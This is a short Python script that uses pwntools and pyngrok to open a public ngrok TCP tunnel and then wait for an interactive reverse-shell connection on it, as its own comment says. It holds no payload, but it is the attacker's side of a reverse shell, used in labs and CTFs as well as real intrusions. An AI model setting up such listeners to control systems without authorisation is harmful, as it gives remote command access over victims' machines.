from pwn import *
from pyngrok import ngrok

class ShellHandler:
	def __init__(self, port=4444):
		self.port = port
        
	def createListener(self):
    # Create the reverse shell listener
		l = listen(self.port)
		l1 = l.wait_for_connection()
		s = l1.interactive()
    
	def tunnelOpener(self):
    # Open the ngrok tunnel
		print(ngrok.connect(self.port, "tcp"))
	
	def main(self):
		self.tunnelOpener()
		self.createListener()

if __name__ == "__main__":
	s = ShellHandler(1234)
	s.main()
